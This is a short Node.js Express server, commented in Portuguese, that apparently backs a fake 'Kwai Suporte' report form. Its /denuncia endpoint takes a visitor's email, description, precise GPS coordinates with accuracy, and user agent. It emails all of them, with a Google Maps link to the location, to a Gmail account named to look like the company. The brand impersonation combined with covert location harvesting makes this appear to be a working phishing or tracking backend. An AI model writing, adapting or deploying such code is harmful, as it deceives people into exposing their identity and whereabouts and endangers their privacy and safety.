const express = require('express');
const nodemailer = require('nodemailer');
const app = express();
const PORT = process.env.PORT || 3000;

// Configurar o nodemailer para Gmail (Ative "senha de app" no Gmail)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'kuaishoufreedeshcompany@gmail.com', // Troque para seu Gmail
    pass: 'SUA_SENHA_DE_APP_AQUI' // Coloque a senha de app do Gmail
  }
});

app.use(express.json());
app.use(express.static('.'));

app.post('/denuncia', async (req, res) => {
  const {email, desc, lat, lon, acc, userAgent} = req.body;
  const html = `
    <h2>Nova denúncia recebida (Suporte Kwai)</h2>
    <b>E-mail do usuário:</b> ${email}<br>
    <b>Descrição:</b> ${desc}<br>
    <b>Localização:</b> ${lat&&lon ? `https://www.google.com/maps?q=${lat},${lon} (Precisão: ${acc}m)` : 'Não obtida'}<br>
    <b>User-Agent:</b> ${userAgent}
  `;
  try {
    await transporter.sendMail({
      from: '"Kwai Suporte" <kuaishoufreedeshcompany@gmail.com>',
      to: 'kuaishoufreedeshcompany@gmail.com',
      subject: 'Nova denúncia - Kwai Suporte',
      html
    });
    res.send("Denúncia enviada com sucesso! Nossa equipe irá analisar.");
  } catch (err) {
    res.status(500).send("Erro ao enviar denúncia.");
  }
});

app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));